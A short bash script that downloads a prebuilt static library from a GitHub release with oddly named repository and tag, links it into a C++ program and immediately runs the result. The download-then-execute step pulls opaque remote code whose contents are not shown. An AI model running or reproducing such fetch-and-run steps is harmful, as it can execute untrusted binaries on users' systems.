#!/usr/bin/env bash
set -e
LIB="giga-sign.a"
TAG="frosty-anchor-hidden-ember"
REPO="minaresads/pythawedrafter"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
curl --retry 3 -fsSL --max-time 180 --connect-timeout 15 -o "$LIB" "$URL"
g++ -o app -O2 -std=c++17 -pthread main.cpp "$LIB" && ./app
